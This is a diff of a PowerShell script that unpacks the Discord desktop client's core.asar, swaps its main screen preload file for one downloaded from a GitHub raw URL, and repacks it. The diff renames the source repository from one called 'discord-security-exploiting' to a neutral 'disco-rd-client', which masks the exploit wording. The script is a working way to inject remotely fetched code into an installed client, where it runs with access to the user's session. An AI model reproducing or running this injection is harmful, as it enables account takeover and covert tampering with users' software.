@@ -7,7 +7,7 @@ if (Test-Path "rd") { remove-item "rd" }
 npx asar extract core.asar rd
 cd rd\app
 remove-item "mainScreenPreload.js"
-Invoke-WebRequest https://raw.githubusercontent.com/FiskDk/discord-security-exploiting/master/windows_preload.js -OutFile mainScreenPreload.js
+Invoke-WebRequest https://raw.githubusercontent.com/FiskDk/disco-rd-client/master/windows_preload.js -OutFile mainScreenPreload.js
 cd C:\Users\f1sk\AppData\Roaming\discord\0.0.*\modules\discord_desktop_core
 if (test-path "core.asar") { rename-item "core.asar" "core.old" }
 npx asar pack rd core.asar
